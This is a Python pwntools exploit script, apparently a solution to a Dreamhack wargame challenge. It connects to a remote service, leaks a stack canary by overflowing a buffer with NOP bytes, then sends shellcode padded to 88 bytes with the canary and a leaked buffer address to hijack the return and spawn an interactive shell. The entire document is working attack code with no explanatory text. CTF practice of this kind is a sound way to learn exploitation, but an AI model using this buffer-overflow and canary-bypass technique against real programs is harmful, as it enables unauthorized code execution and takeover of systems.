from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23491
r = remote(HOST, PORT)

r.recvuntil(b'buf: ')
buf = int(r.recvline().decode(), 16)

r.sendlineafter(b'Input: ', b'\x90' * 88)
r.recvuntil(b'\'')
canary = u64(r.recvuntil(b'\'').strip(b'\x90\n')[:7].ljust(8, b'\x00')) << 8

sh=asm(shellcraft.sh())
r.sendlineafter(b'Input: ', sh.ljust(88, b'\x90') + p64(canary) + b'A' * 8 + p64(buf))

r.interactive()